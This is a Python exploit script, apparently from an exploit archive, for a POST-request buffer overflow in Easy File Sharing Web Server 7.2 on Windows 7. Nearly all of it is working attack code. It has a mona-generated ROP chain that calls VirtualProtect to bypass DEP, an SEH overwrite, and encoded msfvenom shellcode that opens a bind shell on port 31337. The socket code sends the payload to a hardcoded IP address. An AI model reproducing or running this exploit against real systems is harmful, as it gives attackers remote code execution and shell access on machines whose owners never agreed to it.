# Easy File Sharing Web Server 7.2 - 'POST' Buffer Overflow (DEP Bypass with ROP)
# Credits to : bl4ck h4ck3r | Based off of https://www.exploit-db.com/exploits/42186
# Tested on Windows 7 Home Basic SP1
# Opens shell on port 31337 DEP Bypass! (ROP)

import socket
import struct

def create_rop_chain():
	
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
		# 0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0xFFFFFDFE,  # -202
		0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
		0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]|   {PAGE_EXECUTE_READ}
		0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
		0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0x1004de84,  # &Writable location [ImageLoad.dll]
		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
		0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
		0x61c0a798,  # XCHG EAX,EDI # RETN [sqlite3.dll]
		0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll]
		0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll]
		0x100218f9,  # POP EBP # RETN [ImageLoad.dll]
		0x61c24169,  # & push esp # ret  [sqlite3.dll]
		0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x1001bd98,  # POP ECX # RETN [ImageLoad.dll]
		0x1004de84,  # &Writable location [ImageLoad.dll]
		0x61c373a4,  # POP EDI # RETN [sqlite3.dll]
		0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0x90909090,  # nop
		0x100240c2,  # PUSHAD # RETN [ImageLoad.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
	
rop_chain = create_rop_chain()


# msfvenom -p windows/shell_bind_tcp LPORT=31337 -e x86/alpha_mixed -v shellcode -f python EXITFUNC=thread

shellcode =  "\x90" * 200
shellcode += "\x89\xe6\xdb\xd8\xd9\x76\xf4\x5b\x53\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x59\x6c\x39\x78\x4d\x52\x73\x30\x43\x30\x47\x70"
shellcode += "\x51\x70\x6f\x79\x4b\x55\x44\x71\x6b\x70\x65\x34"
shellcode += "\x4e\x6b\x32\x70\x64\x70\x6c\x4b\x53\x62\x76\x6c"
shellcode += "\x6e\x6b\x33\x62\x52\x34\x4e\x6b\x53\x42\x67\x58"
shellcode += "\x64\x4f\x6f\x47\x70\x4a\x37\x56\x74\x71\x69\x6f"
shellcode += "\x6e\x4c\x65\x6c\x70\x61\x61\x6c\x75\x52\x46\x4c"
shellcode += "\x67\x50\x4f\x31\x6a\x6f\x54\x4d\x73\x31\x59\x57"
shellcode += "\x6d\x32\x5a\x52\x66\x32\x56\x37\x4c\x4b\x56\x32"
shellcode += "\x54\x50\x4c\x4b\x30\x4a\x77\x4c\x4e\x6b\x52\x6c"
shellcode += "\x47\x61\x42\x58\x7a\x43\x62\x68\x77\x71\x6e\x31"
shellcode += "\x46\x31\x4c\x4b\x76\x39\x35\x70\x53\x31\x6a\x73"
shellcode += "\x4c\x4b\x42\x69\x72\x38\x6a\x43\x54\x7a\x43\x79"
shellcode += "\x6e\x6b\x44\x74\x4e\x6b\x77\x71\x5a\x76\x55\x61"
shellcode += "\x69\x6f\x6e\x4c\x49\x51\x38\x4f\x56\x6d\x57\x71"
shellcode += "\x6f\x37\x74\x78\x39\x70\x52\x55\x4a\x56\x63\x33"
shellcode += "\x63\x4d\x39\x68\x47\x4b\x43\x4d\x61\x34\x73\x45"
shellcode += "\x79\x74\x30\x58\x6e\x6b\x31\x48\x57\x54\x45\x51"
shellcode += "\x78\x53\x71\x76\x4c\x4b\x64\x4c\x32\x6b\x4c\x4b"
shellcode += "\x62\x78\x65\x4c\x35\x51\x69\x43\x4c\x4b\x63\x34"
shellcode += "\x6c\x4b\x53\x31\x4a\x70\x4c\x49\x61\x54\x75\x74"
shellcode += "\x54\x64\x31\x4b\x71\x4b\x55\x31\x50\x59\x33\x6a"
shellcode += "\x53\x61\x6b\x4f\x4d\x30\x43\x6f\x71\x4f\x62\x7a"
shellcode += "\x4c\x4b\x47\x62\x78\x6b\x4c\x4d\x71\x4d\x50\x68"
shellcode += "\x50\x33\x44\x72\x47\x70\x45\x50\x62\x48\x70\x77"
shellcode += "\x42\x53\x47\x42\x73\x6f\x50\x54\x30\x68\x70\x4c"
shellcode += "\x72\x57\x51\x36\x54\x47\x49\x6f\x4e\x35\x4d\x68"
shellcode += "\x6c\x50\x35\x51\x75\x50\x63\x30\x51\x39\x68\x44"
shellcode += "\x36\x34\x52\x70\x65\x38\x34\x69\x4b\x30\x42\x4b"
shellcode += "\x47\x70\x4b\x4f\x38\x55\x70\x6a\x35\x58\x32\x79"
shellcode += "\x36\x30\x6d\x32\x49\x6d\x77\x30\x42\x70\x47\x30"
shellcode += "\x36\x30\x51\x78\x6b\x5a\x64\x4f\x4b\x6f\x4d\x30"
shellcode += "\x49\x6f\x78\x55\x4d\x47\x61\x78\x67\x72\x55\x50"
shellcode += "\x63\x4a\x55\x39\x6b\x39\x7a\x46\x52\x4a\x62\x30"
shellcode += "\x52\x76\x52\x77\x45\x38\x5a\x62\x39\x4b\x34\x77"
shellcode += "\x63\x57\x49\x6f\x4e\x35\x71\x47\x53\x58\x6d\x67"
shellcode += "\x48\x69\x56\x58\x59\x6f\x49\x6f\x6b\x65\x70\x57"
shellcode += "\x73\x58\x74\x34\x6a\x4c\x55\x6b\x6b\x51\x69\x6f"
shellcode += "\x4e\x35\x30\x57\x6f\x67\x45\x38\x63\x45\x52\x4e"
shellcode += "\x72\x6d\x45\x31\x49\x6f\x58\x55\x43\x58\x71\x73"
shellcode += "\x42\x4d\x70\x64\x37\x70\x4b\x39\x58\x63\x51\x47"
shellcode += "\x61\x47\x30\x57\x34\x71\x48\x76\x50\x6a\x46\x72"
shellcode += "\x62\x79\x56\x36\x4d\x32\x39\x6d\x70\x66\x49\x57"
shellcode += "\x61\x54\x46\x44\x37\x4c\x73\x31\x47\x71\x6e\x6d"
shellcode += "\x62\x64\x71\x34\x36\x70\x6a\x66\x77\x70\x50\x44"
shellcode += "\x66\x34\x30\x50\x56\x36\x46\x36\x61\x46\x62\x66"
shellcode += "\x32\x76\x72\x6e\x66\x36\x53\x66\x33\x63\x36\x36"
shellcode += "\x30\x68\x42\x59\x78\x4c\x67\x4f\x6d\x56\x69\x6f"
shellcode += "\x39\x45\x4f\x79\x6b\x50\x62\x6e\x50\x56\x50\x46"
shellcode += "\x69\x6f\x56\x50\x35\x38\x65\x58\x4d\x57\x45\x4d"
shellcode += "\x45\x30\x49\x6f\x6a\x75\x4f\x4b\x59\x70\x37\x6d"
shellcode += "\x34\x6a\x34\x4a\x45\x38\x6d\x76\x5a\x35\x4d\x6d"
shellcode += "\x6f\x6d\x39\x6f\x6b\x65\x57\x4c\x43\x36\x73\x4c"
shellcode += "\x45\x5a\x4f\x70\x6b\x4b\x59\x70\x43\x45\x74\x45"
shellcode += "\x4f\x4b\x32\x67\x36\x73\x61\x62\x50\x6f\x63\x5a"
shellcode += "\x65\x50\x42\x73\x39\x6f\x69\x45\x41\x41"
 
seh = struct.pack('<L', 0x1002280a) # 0x1002280a :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}

crash = "A" * 2278 + rop_chain + shellcode
crash += "B" * (1794 - len(shellcode)-len(rop_chain)) + seh

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.32.160', 80))
s.send("POST /sendemail.ghp HTTP/1.1\r\n\r\nEmail=" + crash + "&getPassword=Get+Password")
s.close()
